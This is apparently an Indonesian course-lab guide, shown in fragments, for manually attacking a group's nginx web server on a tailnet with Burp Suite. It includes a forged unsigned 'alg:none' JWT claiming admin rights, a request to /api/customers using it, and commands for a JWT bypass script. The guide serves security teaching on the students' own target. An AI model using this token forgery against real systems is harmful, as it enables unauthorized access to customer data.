...
Target: web server Kelompok 5 (container nginx) yang berjalan di Docker dan
merupakan **node tailnet**. Alat: **Burp Suite** (Repeater & Intruder) -
dilarang automated vulnerability scanner. Semua serangan memanipulasi request
secara manual dan **tanpa memutus koneksi server** (bukan DDoS/flooding).

> **Target URL** = alamat tailnet web server. Dapatkan di server via
> `docker exec nginx tailscale ip -4` (mis. `100.98.42.7`). Ganti
> `<IP-tailnet-nginx>` di bawah dengan IP tersebut (atau `localhost:8081`
> untuk tes dev lokal tanpa tailscale).
...
3. Buka **Target → Site map**, pastikan `http://<IP-tailnet-nginx>` sudah masuk scope.
...
1. **Burp Decoder** → Encode base64url (tanpa `=`):
   ...
   - `{"sub":"999","username":"attacker","role":"admin","iat":0,"exp":4102444800}`
     → `eyJzdWIiOiI5OTkiLCJ1c2VybmFtZSI6ImF0dGFja2VyIiwicm9sZSI6ImFkbWluIiwiaWF0IjowLCJleHAiOjQxMDI0NDQ0ODAwfQ`
...
GET /api/customers HTTP/1.1
Host: <IP-tailnet-nginx>
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiI5OTkiLCJ1c2VybmFtZSI6ImF0dGFja2VyIiwicm9sZSI6ImFkbWluIiwiaWF0IjowLCJleHAiOjQxMDI0NDQ0ODAwfQ.
```
...
>
> ```bash
> python scripts/bypass_jwt.py --none --target http://<IP-tailnet-nginx>
> ```
...
```bash
python scripts/bypass_jwt.py --hs256 --target http://<IP-tailnet-nginx>
```
...
websocat ws://<IP-tailnet-nginx>/ws/notifications
```
